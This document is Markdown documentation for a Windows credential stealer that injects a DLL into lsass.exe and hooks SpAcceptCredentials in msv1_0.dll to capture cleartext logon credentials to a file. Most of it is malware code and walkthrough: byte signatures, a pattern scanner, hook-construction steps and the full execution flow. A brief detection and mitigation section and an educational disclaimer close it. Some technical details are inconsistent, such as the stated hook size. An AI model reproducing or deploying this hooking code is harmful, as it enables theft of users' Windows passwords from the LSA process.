# Technical Documentation - MSV1_0.dll Credential Stealer

## Table of Contents
1. [Overview](#overview)
2. [Library Dependencies](#library-dependencies)
3. [Assembly Code Analysis](#assembly-code-analysis)
4. [Function Hooking Mechanism](#function-hooking-mechanism)
5. [PE Headers and Memory Layout](#pe-headers-and-memory-layout)
6. [Pattern Scanning](#pattern-scanning)
7. [Hook Construction](#hook-construction)
8. [Function Pointer Casting](#function-pointer-casting)
9. [Complete Execution Flow](#complete-execution-flow)
10. [Security Considerations](#security-considerations)

## Overview

This credential stealer intercepts clear-text credentials during interactive logons by hooking the `SpAcceptCredentials` function in `msv1_0.dll`. The technique involves:

- **Pattern Scanning**: Finding the target function in memory using byte signatures
- **Function Hooking**: Patching the function to redirect execution
- **Credential Interception**: Capturing credentials during authentication
- **Transparent Operation**: Maintaining system functionality while stealing credentials

## Library Dependencies

### Core Windows Headers
```cpp
#include <iostream>      // Standard I/O operations
#include <Windows.h>     // Windows API functions and types
#include <cstring>       // std::memcpy() for memory operations
```

### Security-Specific Headers
```cpp
#define SECURITY_WIN32   // Enable 32-bit security definitions
#include <Sspi.h>        // Security Support Provider Interface
#include <ntsecapi.h>    // NT Security API structures
#include <ntsecpkg.h>    // NT Security Package structures
```

**Purpose of Each Header:**
- **`Sspi.h`**: Provides security structures and authentication functions
- **`ntsecapi.h`**: Defines `SECURITY_LOGON_TYPE`, `UNICODE_STRING`, and other security types
- **`ntsecpkg.h`**: Provides `SECPKG_PRIMARY_CRED` and `SECPKG_SUPPLEMENTAL_CRED` structures
- **`cstring`**: Provides `std::memcpy()` for safe memory copying operations

## Assembly Code Analysis

### 1. Target Function Pattern (SpAcceptCredentials Prologue)

```cpp
char startOfPatternSpAccecptedCredentials[] = { 
    0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 
};
```

**Assembly Breakdown:**
```assembly
48 83 ec 20    ; sub rsp, 32          ; Allocate 32 bytes on stack
49 8b d9       ; mov rbx, r9          ; Save 4th parameter (SupplementalCredentials)
49 8b f8       ; mov rdi, r8          ; Save 3rd parameter (PrimaryCredentials)  
8b f1          ; mov esi, ecx         ; Save 1st parameter (LogonType)
48             ; (part of next instruction)
```

**What This Represents:**
- **Function Prologue**: Standard x64 function entry point
- **Stack Allocation**: `sub rsp, 32` allocates local variable space
- **Parameter Preservation**: Saves function parameters to registers for later use
- **x64 Calling Convention**: Parameters passed in `rcx`, `rdx`, `r8`, `r9`

### 2. Hook Assembly Code

```cpp
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
```

**Assembly Breakdown:**
```assembly
48 b8 [8-byte-address]  ; mov rax, <64-bit-address-of-hook-function>
ff e0                    ; jmp rax                    ; jump to hook function
```

**What This Does:**
- **Load Hook Address**: `mov rax, <address>` loads our function address into `rax`
- **Jump to Hook**: `jmp rax` transfers execution to our hook function
- **Total Size**: 10 bytes (2 + 8 + 2)

## Function Hooking Mechanism

### How Function Hooking Works

**The Magic of Interception:**
1. **Original Call**: Windows calls `SpAcceptCredentials(rcx, rdx, r8, r9)`
2. **Patched Entry**: First instruction is replaced with our hook code
3. **Execution Redirect**: Instead of normal function prologue, our code executes
4. **Parameter Preservation**: Same parameters are available to our hook function
5. **Transparent Operation**: User still logs in successfully

### Parameter Passing Explanation

**Why Our Hook Gets the Right Parameters:**
```cpp
// Windows calls:
SpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);

// But we've patched the entry point to:
mov rax, <hookedSpAccecptedCredentials>
jmp rax

// Our function receives the SAME parameters:
hookedSpAccecptedCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
```

**x64 Calling Convention:**
- `rcx` = 1st parameter (LogonType)
- `rdx` = 2nd parameter (AccountName)
- `r8` = 3rd parameter (PrimaryCredentials)
- `r9` = 4th parameter (SupplementalCredentials)
- Stack = additional parameters (if any)

## PE Headers and Memory Layout

### PE File Structure

```cpp
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
```

**PE Header Components:**

1. **DOS Header** (`PIMAGE_DOS_HEADER`):
   - Located at the very beginning of the DLL
   - Contains `e_lfanew` field pointing to NT header
   - Legacy compatibility header

2. **NT Header** (`PIMAGE_NT_HEADERS`):
   - Contains file header and optional header
   - `OptionalHeader.SizeOfImage` = total size of DLL in memory
   - Critical for determining scan boundaries

**Memory Layout:**
```
msv1_0.dll in Memory:
┌─────────────────┐
│   DOS Header    │ ← targetModule
├─────────────────┤
│   NT Header     │ ← targetModule + e_lfanew
├─────────────────┤
│   Code Section  │ ← Where we scan for patterns
├─────────────────┤
│   Data Section  │
├─────────────────┤
│   ...           │
└─────────────────┘ ← targetModule + SizeOfImage
```

**Why We Need SizeOfImage:**
- **Scan Boundaries**: Pattern scanner needs to know where to stop
- **Memory Safety**: Prevents scanning beyond DLL boundaries
- **Efficiency**: Avoids unnecessary memory access

## Pattern Scanning

### Pattern Matching Algorithm

```cpp
PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
{
    unsigned int index = 0;
    PVOID patternAddress = NULL;
    char *patternByte = 0;
    char *memoryByte = 0;
    
    do {
        if (startAddress[index] == pattern[0]) {
            for (size_t i = 1; i < patternSize; i++) {
                *(char *)&patternByte = pattern[i];
                *(char *)&memoryByte = startAddress[index + i];
                
                if (patternByte != memoryByte) {
                    break;
                }
                
                if (i == patternSize - 1) {
                    patternAddress = (LPVOID)(&startAddress[index]);
                    return patternAddress;
                }
            }
        }
        ++index;
    } while (index < searchBytes);
    
    return (PVOID)NULL;
}
```

**Algorithm Steps:**
1. **Linear Scan**: Search through memory byte by byte
2. **First Byte Match**: Look for first byte of pattern
3. **Full Pattern Check**: If first byte matches, check remaining bytes
4. **Return Address**: Return address of pattern start if found

**Pattern Location Calculation:**
```cpp
patternStartAddressOfSpAccecptedCredentials = GetPatternMemoryAddress(...);
addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);
```

**Why -16:**
- Pattern is found **inside** the function
- Function entry point is 16 bytes **before** the pattern
- This gives us the actual function start address

## Hook Construction

### Step-by-Step Assembly Building

**Step 1: Backup Original Function**
```cpp
std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
```
- **Purpose**: Save original 12 bytes for later restoration
- **Why**: Need to temporarily "unhook" to call original function

**Step 2: Build Hook Assembly**
```cpp
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
```
- **Initial State**: `[48, b8, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00]`
- **Assembly**: `mov rax, <placeholder-address>`

**Step 3: Insert Function Address**
```cpp
DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
```
- **Why +2**: Skip `mov rax` instruction (2 bytes: `48 b8`)
- **Result**: `[48, b8, <8-byte-address>, 00, 00, 00, 00]`

**Step 4: Add Jump Instruction**
```cpp
std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
```
- **Why +2 + 8**: Skip `mov rax` (2) + address (8) = position 10
- **Result**: `[48, b8, <8-byte-address>, ff, e0, 00, 00]`
- **Assembly**: `mov rax, <address>; jmp rax`

**Final Assembly:**
```assembly
mov rax, <hookedSpAccecptedCredentials>  ; Load our function address
jmp rax                                  ; Jump to our function
```

## Function Pointer Casting

### The Casting Mechanism

```cpp
_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
```

**What's Happening:**
- `addressOfSpAcceptCredentials` = `PVOID` (raw memory address)
- `_SpAcceptCredentials` = function pointer type
- **Cast**: Convert raw address to callable function pointer

**Function Pointer Type Definition:**
```cpp
using _SpAcceptCredentials = NTSTATUS(NTAPI *)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
```

**Why This Works:**
- **Same Signature**: Our hook and original have identical signatures
- **Same Calling Convention**: Both use `NTAPI` (`__stdcall` on x64)
- **Parameter Compatibility**: Same parameter types and order

**Usage:**
```cpp
// Can't call raw address:
addressOfSpAcceptCredentials(params); // ERROR!

// Can call function pointer:
originalSpAcceptCredentials(params); // WORKS!
```

## Complete Execution Flow

### 1. DLL Injection Phase
```
DLL injected into lsass.exe
↓
DllMain(DLL_PROCESS_ATTACH) called
↓
installSpAccecptedCredentialsHook() called
```

### 2. Hook Installation Phase
```
GetModuleHandleA("msv1_0.dll")
↓
Parse PE headers for SizeOfImage
↓
Scan for SpAcceptCredentials pattern
↓
Calculate function entry point (pattern - 16)
↓
Backup original 12 bytes
↓
Build hook assembly (mov rax, <hook>; jmp rax)
↓
Write hook to function entry point
```

### 3. Credential Interception Phase
```
User attempts interactive logon
↓
Windows calls SpAcceptCredentials
↓
Our hook executes instead
↓
Capture credentials to file
↓
Temporarily restore original function
↓
Call original SpAcceptCredentials
↓
User logs in successfully
↓
Reinstall hook after delay
```

### 4. Hook Reinstallation Phase
```
CreateThread(installSpAccecptedCredentialsHook)
↓
Sleep(5000ms) - allow original to complete
↓
Reinstall hook for next login
```

## Security Considerations

### Detection Methods

**Memory Scanning:**
- Look for hooked functions in `msv1_0.dll`
- Detect `mov rax, <address>; jmp rax` patterns
- Monitor for function entry point modifications

**File Monitoring:**
- Monitor `c:\temp\credentials.txt`
- Detect credential file creation
- Watch for unusual file access patterns

**Process Injection Detection:**
- Detect DLL injection into LSASS
- Monitor for suspicious process modifications
- Alert on unauthorized LSASS access

### Mitigation Strategies

**Credential Guard:**
- Prevents credential theft in memory
- Isolates LSASS from user mode processes
- Requires UEFI Secure Boot

**LSA Protection:**
- Protects LSASS from injection
- Requires administrative privileges to disable
- Monitors for unauthorized modifications

**Memory Protection:**
- DEP (Data Execution Prevention)
- ASLR (Address Space Layout Randomization)
- CFG (Control Flow Guard)

### Limitations

**Windows Version Dependencies:**
- Pattern signatures may change between Windows versions
- Function offsets can vary
- PE header structures may differ

**Antivirus Detection:**
- Modern EDR solutions detect this technique
- Memory scanning can identify hooks
- Behavioral analysis flags suspicious activity

**Stability Risks:**
- Hooking system functions can cause instability
- Race conditions during hook/unhook cycles
- Potential for system crashes if not implemented carefully

## Technical Notes

### Architecture Requirements
- **Target**: x64 Windows systems only
- **Dependencies**: Windows Security APIs
- **Memory Permissions**: Requires RWX memory for hooking
- **Privileges**: Administrative access required

### Performance Impact
- **Minimal**: Hook adds negligible overhead
- **Memory**: Small memory footprint for hook code
- **CPU**: Pattern scanning is O(n) but only done once
- **I/O**: Only file writes when credentials are captured

### Reliability Considerations
- **Error Handling**: Graceful fallbacks for failed operations
- **Thread Safety**: Delay-based re-hooking prevents race conditions
- **Memory Safety**: Proper bounds checking in pattern scanning
- **File Operations**: Error handling for file creation/writing

---

**Disclaimer**: This documentation is for educational purposes only. The techniques described should only be used in authorized testing environments with proper permissions. 